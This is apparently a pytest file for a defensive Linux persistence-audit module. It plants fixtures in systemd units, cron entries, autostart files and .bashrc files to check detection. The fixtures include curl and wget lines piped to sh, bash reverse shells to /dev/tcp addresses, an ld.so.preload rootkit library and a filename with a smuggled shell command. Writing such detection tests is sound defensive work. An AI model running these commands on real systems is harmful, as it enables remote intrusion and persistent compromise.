"""Tests for linux_persistence_audit.

The module's value depends on not crying wolf: an ordinary systemd unit or
.bashrc must produce an inventory entry and nothing more, while fetch-and-execute
patterns, /tmp execution, and world-writable startup files must always escalate.
"""

import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

# These tests assert on POSIX file modes — the world-writable check is the whole
# point of one of them. Windows reports 0o666 for ordinary files, so the check
# fires on every fixture and "an ordinary unit produces only an inventory entry"
# becomes untestable. The module is Linux-only and can never run there anyway.
pytestmark = pytest.mark.skipif(
    os.name != "posix",
    reason="linux_persistence_audit is Linux-only and asserts on POSIX file modes",
)

from rescue.command import CommandResult
from rescue.models import Mode, Platform, Severity, SystemProfile
from rescue.registry import discover_modules


def _get_module():
    modules = discover_modules(Path(__file__).parent.parent / "modules")
    return next(m for m in modules if m.name == "linux_persistence_audit")


def _profile(platform=Platform.LINUX) -> SystemProfile:
    return SystemProfile(
        platform=platform,
        os_name="Ubuntu 24.04",
        os_version="6.8.0",
        architecture="x86_64",
        cpu_model="Test",
        cpu_cores=4,
        ram_bytes=8 * 1024**3,
    )


def _no_crontab(mod):
    def fake(args, **kwargs):
        return CommandResult(
            args=list(args), returncode=1, stdout="", stderr="",
            timed_out=False, error=None, duration_s=0.0, truncated=False,
        )

    return patch.object(sys.modules[type(mod).__module__], "run", side_effect=fake)


def _configure(mod, tmp_path):
    """Point every traversal root at a fixture tree, per the repo convention."""
    units = tmp_path / "units"
    autostart = tmp_path / "autostart"
    cron = tmp_path / "cron"
    for directory in (units, autostart, cron):
        directory.mkdir(parents=True, exist_ok=True)
    mod.system_unit_dirs = [str(units)]
    mod.user_unit_dirs = []
    mod.autostart_dirs = [str(autostart)]
    mod.cron_dirs = [str(cron)]
    mod.shell_rc_files = []
    mod.ld_preload_path = str(tmp_path / "absent-ld-preload")
    return units, autostart, cron


def _codes(result):
    return [f.code for f in result.findings]


def test_non_linux_is_unsupported():
    assert _get_module().check(_profile(Platform.DARWIN)).supported is False


def test_ordinary_unit_is_inventoried_and_not_flagged(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "syncthing.service").write_text(
        "[Unit]\nDescription=Syncthing\n[Service]\nExecStart=/usr/bin/syncthing\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    codes = _codes(result)
    assert codes == ["security.linux_persistence_audit.inventory"]
    inventory = result.findings[0]
    assert inventory.severity is Severity.INFO
    assert inventory.data["count"] == 1


def test_curl_piped_to_shell_is_critical(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "evil.service").write_text(
        "[Service]\nExecStart=/bin/sh -c 'curl -s http://example.invalid/x | sh'\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("suspicious_content"))
    assert finding.severity is Severity.CRITICAL


def test_reverse_shell_pattern_is_detected(tmp_path):
    mod = _get_module()
    _, _, cron = _configure(mod, tmp_path)
    (cron / "backdoor").write_text("* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.suspicious_content" in _codes(result)


def test_execution_from_tmp_is_flagged(tmp_path):
    mod = _get_module()
    _, autostart, _ = _configure(mod, tmp_path)
    (autostart / "updater.desktop").write_text(
        "[Desktop Entry]\nType=Application\nExec=/tmp/.hidden/updater\n"
    )
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("volatile_path_execution"))
    assert finding.severity is Severity.WARNING


def test_world_writable_startup_file_is_flagged(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    unit = units / "loose.service"
    unit.write_text("[Service]\nExecStart=/usr/bin/true\n")
    unit.chmod(0o666)
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.world_writable_unit" in _codes(result)


def test_ld_preload_content_is_critical(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)
    preload = tmp_path / "ld.so.preload"
    preload.write_text("/usr/lib/libprocesshider.so\n")
    mod.ld_preload_path = str(preload)
    with _no_crontab(mod):
        result = mod.check(_profile())
    finding = next(f for f in result.findings if f.code.endswith("ld_preload_set"))
    assert finding.severity is Severity.CRITICAL
    assert "libprocesshider" in finding.data["content"]


def test_empty_ld_preload_is_not_reported(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)
    preload = tmp_path / "ld.so.preload"
    preload.write_text("\n")
    mod.ld_preload_path = str(preload)
    with _no_crontab(mod):
        result = mod.check(_profile())
    assert "security.linux_persistence_audit.ld_preload_set" not in _codes(result)


def test_user_crontab_is_included(tmp_path):
    mod = _get_module()
    _configure(mod, tmp_path)

    def fake(args, **kwargs):
        return CommandResult(
            args=list(args), returncode=0,
            stdout="# comment\n0 * * * * /usr/local/bin/sync.sh\n",
            stderr="", timed_out=False, error=None, duration_s=0.0, truncated=False,
        )

    with patch.object(sys.modules[type(mod).__module__], "run", side_effect=fake):
        result = mod.check(_profile())
    inventory = next(f for f in result.findings if f.code.endswith("inventory"))
    assert any(e["kind"] == "user crontab" for e in inventory.data["entries"])


def test_fix_never_deletes_and_prefers_disabling(tmp_path):
    mod = _get_module()
    units, _, _ = _configure(mod, tmp_path)
    (units / "evil.service").write_text("[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n")
    with _no_crontab(mod):
        check = mod.check(_profile())
    fix = mod.fix(check, Mode.CLI)
    assert fix.executed_mutations == []
    text = " ".join(a.description for a in fix.actions)
    assert "disable" in text
    assert "cannot be examined" in text


# ---------------- offline: a Linux disk mounted elsewhere ----------------

from rescue.profiler.base import gather_target_profile  # noqa: E402

_SUSP = "security.linux_persistence_audit.suspicious_content"


def _offline(linux_disk):
    return gather_target_profile(linux_disk, Platform.LINUX)


def test_offline_finds_curl_pipe_sh_unit_on_target(linux_disk):
    (linux_disk / "etc/systemd/system/updater.service").write_text(
        "[Service]\nExecStart=/bin/sh -c 'curl http://x | sh'\n"
    )
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit and hit[0].data["path"] == "/etc/systemd/system/updater.service"
    assert r.not_checked == []


def test_offline_reads_unit_symlink_from_target_not_host(linux_disk):
    (linux_disk / "lib/systemd/system/evil.service").write_text(
        "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'\n"
    )
    wants = linux_disk / "etc/systemd/system/multi-user.target.wants"
    (wants / "evil.service").symlink_to("/lib/systemd/system/evil.service")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit and hit[0].data["path"].endswith("evil.service")
    assert "/dev/tcp" in hit[0].data["excerpt"]


def test_offline_does_not_follow_directory_symlink_to_host(linux_disk, tmp_path):
    host = tmp_path / "hostdir"
    host.mkdir()
    (host / "x.service").write_text("ExecStart=curl http://x | sh\n")
    (linux_disk / "etc/systemd/system/escape").symlink_to(host)
    r = _get_module().check(_offline(linux_disk))
    assert not [f for f in r.findings if f.code == _SUSP]


def test_offline_expands_tilde_for_every_target_user(linux_disk):
    d = linux_disk / "home/sam/.config/autostart"
    d.mkdir(parents=True)
    (d / "x.desktop").write_text("[Desktop Entry]\nExec=/tmp/.x\n")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings
           if f.code == "security.linux_persistence_audit.volatile_path_execution"]
    assert hit and hit[0].data["path"] == "/home/sam/.config/autostart/x.desktop"


def test_offline_reads_spool_crontabs_and_never_runs_crontab(linux_disk):
    spool = linux_disk / "var/spool/cron/crontabs"
    spool.mkdir(parents=True)
    (spool / "sam").write_text("* * * * * wget -qO- http://x | bash\n")
    mod = _get_module()
    with patch.object(sys.modules[type(mod).__module__], "run",
                      side_effect=AssertionError("no host commands offline")):
        r = mod.check(_offline(linux_disk))
    assert any(f.data.get("path") == "/var/spool/cron/crontabs/sam"
               for f in r.findings if f.code == _SUSP)
    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
    assert {"path": "/var/spool/cron/crontabs/sam", "kind": "user crontab"} in inv.data["entries"]


def test_offline_ld_preload_read_from_target(linux_disk):
    (linux_disk / "etc/ld.so.preload").write_text("/usr/lib/libevil.so\n")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"


def test_offline_world_writable_unit(linux_disk):
    p = linux_disk / "etc/systemd/system/loose.service"
    p.write_text("[Service]\n")
    p.chmod(0o666)
    r = _get_module().check(_offline(linux_disk))
    assert any(f.code == "security.linux_persistence_audit.world_writable_unit"
               and f.data["path"] == "/etc/systemd/system/loose.service" for f in r.findings)


def test_offline_ordinary_disk_has_no_warnings(linux_disk):
    r = _get_module().check(_offline(linux_disk))
    assert [f for f in r.findings if f.severity is not Severity.INFO] == []


def test_offline_capable_flag():
    assert _get_module().offline_capable is True


def test_offline_symlinked_ld_preload_is_reported_as_etc_ld_so_preload(linux_disk):
    (linux_disk / "usr/lib").mkdir(parents=True)
    (linux_disk / "usr/lib/pre").write_text("/usr/lib/libevil.so\n")
    (linux_disk / "etc/ld.so.preload").symlink_to("/usr/lib/pre")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.ld_preload_set"]
    assert hit and hit[0].data["path"] == "/etc/ld.so.preload"
    assert "/etc/ld.so.preload lists" in hit[0].description


def test_offline_symlinked_bashrc_shown_at_its_own_path(linux_disk):
    (linux_disk / "home/sam/dotfiles").mkdir()
    (linux_disk / "home/sam/dotfiles/bashrc").write_text("curl http://x | sh\n")
    (linux_disk / "home/sam/.bashrc").symlink_to("dotfiles/bashrc")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit and hit[0].data["path"] == "/home/sam/.bashrc"


def test_offline_symlinked_walk_root_shown_at_its_own_path(linux_disk):
    (linux_disk / "opt/units").mkdir(parents=True)
    (linux_disk / "opt/units/u.service").write_text("ExecStart=curl http://x | sh\n")
    (linux_disk / "usr/local/lib/systemd").mkdir(parents=True)
    (linux_disk / "usr/local/lib/systemd/system").symlink_to("/opt/units")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit and hit[0].data["path"] == "/usr/local/lib/systemd/system/u.service"


def test_offline_spool_scan_is_capped(linux_disk):
    spool = linux_disk / "var/spool/cron/crontabs"
    spool.mkdir(parents=True)
    for i in range(10):
        (spool / f"u{i}").write_text("* * * * * true\n")
    mod = _get_module()
    mod.max_files = 3
    r = mod.check(_offline(linux_disk))
    inv = next(f for f in r.findings if f.data.get("check") == "inventory")
    assert len([e for e in inv.data["entries"] if e["kind"] == "user crontab"]) <= 3


def test_offline_hostile_filename_is_quoted_in_guidance(linux_disk):
    name = "x'; touch pwned; '.service"
    (linux_disk / "etc/systemd/system" / name).write_text("ExecStart=curl http://x | sh\n")
    mod = _get_module()
    r = mod.check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit
    actions = mod.fix(r, Mode.GUIDED if hasattr(Mode, "GUIDED") else list(Mode)[0]).actions
    from shlex import quote
    path = hit[0].data["path"]
    text = "\n".join(a.description for a in actions)
    assert f"cat {quote(path)}" in text
    assert f"cat '{path}'" not in text


def test_offline_control_characters_in_path_are_replaced(linux_disk):
    (linux_disk / "etc/systemd/system" / "a\nb.service").write_text("ExecStart=curl http://x | sh\n")
    r = _get_module().check(_offline(linux_disk))
    hit = [f for f in r.findings if f.code == _SUSP]
    assert hit and "\n" not in hit[0].data["path"] and "a?b.service" in hit[0].data["path"]
